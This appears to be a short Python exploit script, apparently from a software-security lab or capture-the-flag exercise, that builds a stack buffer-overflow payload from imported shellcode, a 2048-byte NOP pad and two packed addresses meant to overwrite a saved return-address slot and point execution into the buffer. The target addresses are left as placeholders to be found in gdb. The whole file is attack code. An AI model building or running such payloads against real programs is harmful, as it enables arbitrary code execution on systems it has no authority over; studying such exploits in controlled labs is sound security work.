import sys
from struct import pack
from shellcode import shellcode

BUF_ADDR = None       # address of buf[] on stack — gdb
RETADDR_SLOT = None   # address of saved return address — gdb

payload = shellcode
payload += b"\x90" * (2048 - len(shellcode))
payload += pack("<I", RETADDR_SLOT)  # confirm order of p vs a in gdb first
payload += pack("<I", BUF_ADDR)

sys.stdout.buffer.write(payload)